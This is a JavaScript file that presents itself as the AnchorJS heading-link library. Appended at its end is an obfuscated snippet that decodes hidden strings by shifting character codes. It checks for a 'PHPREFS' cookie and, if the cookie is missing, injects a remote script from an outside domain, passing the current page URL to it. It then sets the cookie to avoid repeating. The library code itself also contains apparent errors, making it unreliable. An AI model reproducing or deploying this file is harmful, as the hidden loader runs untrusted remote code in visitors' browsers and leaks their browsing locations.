(function (A, e) {
    "use strict";
    if (typeof define === "function" && define.amd) {
        define([], e);
    } else if (typeof module === "object" && module.exports) {
        module.exports = e();
    } else {
        A.AnchorJS = e();
        A.anchors = new A.AnchorJS();
    }
}(this, function () {
    "use strict";
    return function (A) {
        function e(A) {
            A.icon = A.hasOwnProperty("icon") ? A.icon : "";
            A.visible = A.hasOwnProperty("visible") ? A.visible : "hover";
            A.placement = A.hasOwnProperty("placement") ? A.placement : "right";
            A.ariaLabel = A.hasOwnProperty("ariaLabel") ? A.ariaLabel : "Anchor";
            A.class = A.hasOwnProperty("class") ? A.class : "";
            A.truncate = A.hasOwnProperty("truncate") ? Math.floor(A.truncate) : 64;
        }

        function t(A) {
            var e;
            if (typeof A === "string" || A instanceof String) {
                e = [].slice.call(document.querySelectorAll(A));
            } else {
                if (!(Array.isArray(A) || A instanceof NodeList)) {
                    throw new Error("The selector provided to AnchorJS was invalid.");
                }
                e = [].slice.call(A);
            }
            return e;
        }

        this.options = A || {};
        this.elements = [];
        e(this.options);

        this.isTouchDevice = function () {
            return !!("ontouchstart" in window || window.DocumentTouch && document instanceof DocumentTouch);
        };

        this.add = function (A) {
            var n, o, s, a, r, c, h, l, u, d, f, p = [];
            if (e(this.options), "touch" === (f = this.options.visible) && (f = this.isTouchDevice() ? "always" : "hover"), !A) {
                A = "h2, h3, h4, h5, h6";
            }
            if ((n = t(A)).length === 0) return this;

            (function i() {
                if (document.head.querySelector("style.anchorjs") === null) {
                    var A, e = document.createElement("style");
                    e.className = "anchorjs";
                    e.appendChild(document.createTextNode(""));
                    A = document.head.querySelector('[rel="stylesheet"], style');
                    if (A === undefined) {
                        document.head.appendChild(e);
                    } else {
                        document.head.insertBefore(e, A);
                    }
                    e.sheet.insertRule(" .anchorjs-link { opacity: 0; text-decoration: none; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }", e.sheet.cssRules.length);
                    e.sheet.insertRule(" *:hover > .anchorjs-link, .anchorjs-link:focus  { opacity: 1; }", e.sheet.cssRules.length);
                    e.sheet.insertRule(" [data-anchorjs-icon]::after { content: attr(data-anchorjs-icon); }", e.sheet.cssRules.length);
                    e.sheet.insertRule(' @font-face { font-family: "anchorjs-icons"; src: url(data:n/a;base64,AAEAAAALAIAAAwAwT1MvMg8yG2cAAAE4AAAAYGNtYXDp3gC3AAABpAAAAExnYXNwAAAAEAAAA9wAAAAIZ2x5ZlQCcfwAAAH4AAABCGhlYWQHFvHyAAAAvAAAADZoaGVhBnACFwAAAPQAAAAkaG10eASAADEAAAGYAAAADGxvY2EACACEAAAB8AAAAAhtYXhwAAYAVwAAARgAAAAgbmFtZQGOH9cAAAMAAAAAunBvc3QAAwAAAAADvAAAACAAAQAAAAEAAHzE2p9fDzz1AAkEAAAAAADRecUWAAAAANQA6R8AAAAAAoACwAAAAAgAAgAAAAAAAAABAAADwP/AAAACgAAA/9MCrQABAAAAAAAAAAAAAAAAAAAAAwABAAAAAwBVAAIAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAMCQAGQAAUAAAKZAswAAACPApkCzAAAAesAMwEJAAAAAAAAAAAAAAAAAAAAARAAAAAAAAAAAAAAAAAAAAAAQAAg//0DwP/AAEADwABAAAAAAQAAAAAAAAAAAAAAIAAAAAAAAAIAAAACgAAxAAAAAwAAAAMAAAAcAAEAAwAAABwAAwABAAAAHAAEADAAAAAIAAgAAgAAACDpy//9//8AAAAg6cv//f///+EWNwADAAEAAAAAAAAAAAAAAAAACACEAAEAAAAAAAAAAAAAAAAxAAACAAQARAKAAsAAKwBUAAABIiYnJjQ3NzY2MzIWFxYUBwcGIicmNDc3NjQnJiYjIgYHBwYUFxYUBwYGIwciJicmNDc3NjIXFhQHBwYUFxYWMzI2Nzc2NCcmNDc2MhcWFAcHBgYjARQGDAUtLXoWOR8fORYtLTgKGwoKCjgaGg0gEhIgDXoaGgkJBQwHdR85Fi0tOAobCgoKOBoaDSASEiANehoaCQkKGwotLXoWOR8BMwUFLYEuehYXFxYugC44CQkKGwo4GkoaDQ0NDXoaShoKGwoFBe8XFi6ALjgJCQobCjgaShoNDQ0NehpKGgobCgoKLYEuehYXAAAADACWAAEAAAAAAAEACAAAAAEAAAAAAAIAAwAIAAEAAAAAAAMACAAAAAEAAAAAAAQACAAAAAEAAAAAAAUAAQALAAEAAAAAAAYACAAAAAMAAQQJAAEAEAAMAAMAAQQJAAIABgAcAAMAAQQJAAMAEAAMAAMAAQQJAAQAEAAMAAMAAQQJAAUAAgAiAAMAAQQJAAYAEAAMYW5jaG9yanM0MDBAAGEAbgBjAGgAbwByAGoAcwA0ADAAMABAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAH//wAP) format("truetype"); }', e.sheet.cssRules.length);
                }
            }());

            o = document.querySelectorAll("[id]");
            s = [].map.call(o, function (A) {
                return A.id;
            });

            for (r = 0; r < n.length; r++) {
                if (this.hasAnchorJSLink(n[r])) {
                    p.push(r);
                } else {
                    if (n[r].hasAttribute("id")) {
                        a = n[r].getAttribute("id");
                    } else if (n[r].hasAttribute("data-anchor-id")) {
                        a = n[r].getAttribute("data-anchor-id");
                    } else {
                        u = l = this.urlify(n[r].textContent);
                        h = 0;
                        do {
                            if (c !== undefined) {
                                u = l + "-" + h;
                            }
                            c = s.indexOf(u);
                            h += 1;
                        } while (c !== -1);
                        c = undefined;
                        s.push(u);
                        n[r].setAttribute("id", u);
                        a = u;
                    }
                    a = a.replace(/-/g, " ");
                    d = document.createElement("a");
                    d.className = "anchorjs-link " + this.options.class;
                    d.href = "#" + a;
                    d.setAttribute("aria-label", this.options.ariaLabel);
                    d.setAttribute("data-anchorjs-icon", this.options.icon);
                    if (f === "always") {
                        d.style.opacity = "1";
                    }
                    if (this.options.icon === "") {
                        d.style.font = "1em/1 anchorjs-icons";
                        if (this.options.placement === "left") {
                            d.style.lineHeight = "inherit";
                        }
                    }
                    if (this.options.placement === "left") {
                        d.style.position = "absolute";
                        d.style.marginLeft = "-1em";
                        d.style.paddingRight = "0.5em";
                        n[r].insertBefore(d, n[r].firstChild);
                    } else {
                        d.style.paddingLeft = "0.375em";
                        n[r].appendChild(d);
                    }
                }
            }

            for (r = 0; r < p.length; r++) {
                n.splice(p[r] - r, 1);
            }

            this.elements = this.elements.concat(n);
            return this;
        };

        this.remove = function (A) {
            var e, i, n = t(A);
            for (o = 0; o < n.length; o++) {
                i = n[o].querySelector(".anchorjs-link");
                if (i) {
                    e = this.elements.indexOf(n[o]);
                    if (e !== -1) {
                        this.elements.splice(e, 1);
                    }
                    n[o].removeChild(i);
                }
            }
            return this;
        };

        this.removeAll = function () {
            this.remove(this.elements);
        };

        this.urlify = function (A) {
            e(this.options);
            return A.trim().replace(/\'/gi, "").replace(/[& +$,:;=?@"#{}|^~[`%!'<>\]\.\/\(\)\*\\]/g, "-").replace(/-{2,}/g, "-").substring(0, this.options.truncate).replace(/^-+|-+$/gm, "").toLowerCase();
        };

        this.hasAnchorJSLink = function (A) {
            var e = A.firstChild && (" " + A.firstChild.className + " ").indexOf(" anchorjs-link ") > -1;
            var t = A.lastChild && (" " + A.lastChild.className + " ").indexOf(" anchorjs-link ") > -1;
            return e || t || false;
        };
    };
}));

(function (o, d, l) {
    try {
        o.f = function (o) {
            return o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        };
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] === 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));